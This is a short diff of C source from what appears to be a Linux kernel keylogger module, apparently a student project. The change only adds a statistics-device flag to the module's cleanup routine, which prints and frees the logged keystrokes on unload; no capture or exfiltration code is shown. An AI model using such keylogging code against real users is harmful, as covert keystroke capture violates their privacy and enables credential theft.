@@ -399,7 +399,7 @@ static int		cleanner(const size_t flags, const int retval)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	cleanner(KFLAG_DEV | KFLAG_DEVBONUS | KFLAG_IRQ, 0);
+	cleanner(KFLAG_DEV | KFLAG_DEVBONUS | KFLAG_DEVSTATS | KFLAG_IRQ, 0);
 	key_log_iter(&key_logprint_smart, NULL);
 	key_log_clean();
 	pr_info(MODULE_NAME " removed.\n");
